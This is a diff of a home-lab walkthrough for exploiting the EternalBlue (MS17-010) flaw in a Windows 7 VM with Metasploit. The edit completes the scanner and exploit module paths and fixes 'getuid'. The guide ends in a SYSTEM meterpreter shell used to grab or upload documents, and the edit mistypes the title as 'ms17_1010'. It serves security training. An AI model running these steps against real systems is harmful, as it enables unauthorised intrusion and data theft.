@@ -1,4 +1,4 @@
-=== Eternalblue - ms17_010 vulnerability lab ===
+=== Eternalblue - ms17_1010 vulnerability lab ===
 
 --- Items required for procedure ---
 1x Win7 iso via archive.org - https://archive.org/details/20230422_20230422_1429
@@ -52,20 +52,21 @@ Determine if machine is vulnerable
 1. Within your kali linux terminal, input `msfconsole`
 2. Wait a moment for metasploit framework to load
 3. Once loaded, input `search ms17`
-4. You will be presented with several options, input `use auxiliary/scanner/`
+4. You will be presented with several options, input `use auxiliary/scanner/smb/smb_ms17_010`
 5. Type `show options`
 6. Input `SET RHOSTS <target ip>`
-7. This should result in “The machine is vulnerable to…”. Once confirmed the machine is vulnerable.
+7. Type “run”
+8. This should result in “The machine is vulnerable to…”. Once confirmed the machine is vulnerable.
 
 Meterpreter shell
 Now we can gain a shell into the target machine via metasploit framework
 1. Input `search ms17`
-2. Type `use exploit/`
+2. Type `use exploit/windows/smb/ms17_010_eternalblue`
 3. Type `show options`
 4. Input `SET RHOSTS <target IP>`
 5. Type `run`
 
 Congratulations, you have gained a meterpreter shell into the machine.
 
-Type `guid` to ensure you are the system user within the target machine.
+Type `getuid` to ensure you are the system user within the target machine.
 You can type `shell` to get a full shell and do some further stuff like upload or grab documents for other shell options.
